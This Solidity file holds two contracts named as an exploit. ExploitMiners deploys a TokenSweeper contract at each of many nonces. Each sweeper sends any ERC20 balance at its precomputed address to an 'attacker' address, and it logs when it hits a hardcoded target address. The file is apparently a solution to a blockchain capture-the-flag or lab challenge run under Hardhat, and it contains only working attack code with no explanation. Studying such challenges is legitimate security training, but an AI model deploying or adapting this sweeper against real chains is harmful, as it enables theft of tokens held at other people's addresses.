// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

contract ExploitMiners {
    address attacker;
    address token;

    constructor(
        address attacker,
        address token,
        uint256 nonces
    ) {
        for (uint256 idx; idx < nonces; idx++) {
            new TokenSweeper(attacker, token, idx);
        }
    }
}

contract TokenSweeper {
    address public constant targetAddress =
        0x79658d35aB5c38B6b988C23D02e0410A380B8D5c;

    constructor(
        address attacker,
        address token,
        uint256 nonce
    ) {
        uint256 balance = IERC20(token).balanceOf(address(this));
        if (balance > 0) {
            if (address(this) == targetAddress) {
                console.log(
                    "Target address same with produced address: ",
                    address(this),
                    "at nonce: ",
                    nonce
                );
            }
            IERC20(token).transfer(attacker, balance);
        }
    }
}
